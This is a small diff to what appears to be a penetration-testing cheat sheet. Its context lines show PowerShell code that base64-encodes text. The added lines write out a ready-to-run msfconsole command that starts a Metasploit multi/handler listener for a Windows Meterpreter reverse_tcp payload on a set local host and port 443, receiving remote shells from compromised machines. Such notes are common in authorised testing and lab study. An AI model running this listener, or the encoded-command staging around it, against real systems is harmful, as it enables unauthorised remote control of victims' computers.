@@ -33,3 +33,9 @@ $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
 $EncodedText = [Convert]::ToBase64String($Bytes) 
 ```
 
+msfconsole 
+
+```
+msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.50.1;set LPORT 443;run;"
+
+```
